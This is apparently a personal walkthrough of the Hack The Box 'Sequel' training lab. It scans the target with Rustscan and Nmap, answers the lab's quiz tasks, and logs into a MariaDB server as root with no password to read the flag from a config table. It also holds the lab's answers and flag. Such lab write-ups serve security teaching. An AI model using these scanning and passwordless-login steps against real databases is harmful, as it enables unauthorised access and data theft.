- - - 
created : 30-07-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name, watch previous rooms for more details.
# Task 1

During our scan, which port do we find serving MySQL?
## Rustscan/Nmap

We can use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Sequel]
└─$ rustscan -a sequel.htb 

Open 10.129.95.232:3306

3306/tcp open  mysql?  syn-ack ttl 63
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 109
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, InteractiveClient, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsTransactions, SupportsCompression, FoundRows, Speaks41ProtocolOld, Speaks41ProtocolNew, Support41Auth, IgnoreSigpipes, ConnectWithDatabase, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 4|8@vT!Ds;fq'hYdlpp_
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port


```

The answer is pretty clear here
# Task 2

What community-developed MySQL version is the target running?

```bash
 MariaDB 
```
# Task 3

When using the MySQL command line client, what switch do we need to use in order to specify a login username?

```bash
 -u
```
# Task 4

Which username allows us to log into this MariaDB instance without providing a password?

```bash
  root
```
# Task 5

In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

```bash
 *
```
# Task 6

In SQL, what symbol do we need to end each query with?

```bash
 ;
```
# Task 7

There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

We enter the DB with the following commands :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Sequel]
└─$ mysql -u root -h 10.129.95.232
```

When I try to connect to a server using mysql cli commands, I get the error `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it` .

> This can be solved by adding the `--skip_ssl` parameter.

If you don't want to type `--skip-ssl` on the command line every time, you can instead add this to `${HOME}/.my.cnf`:

```sql
[client]
skip-ssl = true
```

Let's try :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Sequel]
└─$ mysql -u root -h sequel.htb --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 37
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0,285 sec)
```

Obviously the answer is `htb` 
# Submit Flag

Submit root flag

To retrieve that we look into databases with the following commands :

```bash

MariaDB [(none)]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0,304 sec)


MariaDB [htb]> SELECT * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0,070 sec)

```